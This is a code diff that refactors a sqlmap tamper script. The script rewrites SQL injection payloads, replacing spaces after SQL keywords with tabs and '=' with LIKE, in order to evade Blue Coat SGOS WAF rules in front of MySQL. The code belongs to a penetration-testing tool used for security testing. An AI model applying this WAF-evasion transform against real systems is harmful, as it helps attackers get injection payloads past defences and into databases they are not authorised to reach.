@@ -12,44 +12,35 @@ from lib.core.common import singleTimeWarnMessage
 from lib.core.enums import DBMS
 from lib.core.enums import PRIORITY
 
-__priority__ = PRIORITY.LOW
+__priority__ = PRIORITY.NORMAL
 
 def dependencies():
     singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))
 
-def process(match):
-  word = match.group()
-  word = "%sLIKE%s" % (" " if word[0] != " " else "", " " if word[-1] != " " else "")
-  return word
-
 def tamper(payload, headers=None):
-	"""
-    First Replaces the space after 'select ' with a valid random blank character.
-		Then replace = with like
+    """
+    Replaces space character after SQL statement with a valid random blank character.
+    Afterwards replace character = with LIKE operator
 
     Example:
         * Input: SELECT id FROM users where id = 1
-        * Output: SELECT%09id FROM users where id like 1
+        * Output: SELECT%09id FROM users where id LIKE 1
 
     Requirement:
-        * MySQL, Bluecoat SGos with Waf activated as documented in
+        * MySQL, Blue Coat SGOS with WAF activated as documented in
         https://kb.bluecoat.com/index?page=content&id=FAQ2147
 
     Tested against:
-        * MySQL 5.1, SGos Rules
+        * MySQL 5.1, SGOS
 
     Notes:
-        * Useful to bypass BlueCoat recommanded Waf rule configuration
-	"""
+        * Useful to bypass Blue Coat's recommended WAF rule configuration
+    """
 
-# ASCII table:
-#   TAB     09      horizontal TAB
-	blanks = '%09'
-	retVal = payload
+    retVal = payload
 
-	if payload:
-		for commands in ['SELECT','UPDATE','INSERT','DELETE']:
-			retVal = retVal.replace(commands + ' ', commands + blanks)
-		retVal = re.sub(r"\s*=\s*", lambda match: process(match), retVal)
+    if payload:
+        retVal = re.sub(r"(?i)(SELECT|UPDATE|INSERT|DELETE)\s+", r"\g<1>\t", payload)
+        retVal = re.sub(r"\s*=\s*", " LIKE ", retVal)
 
-	return retVal
+    return retVal
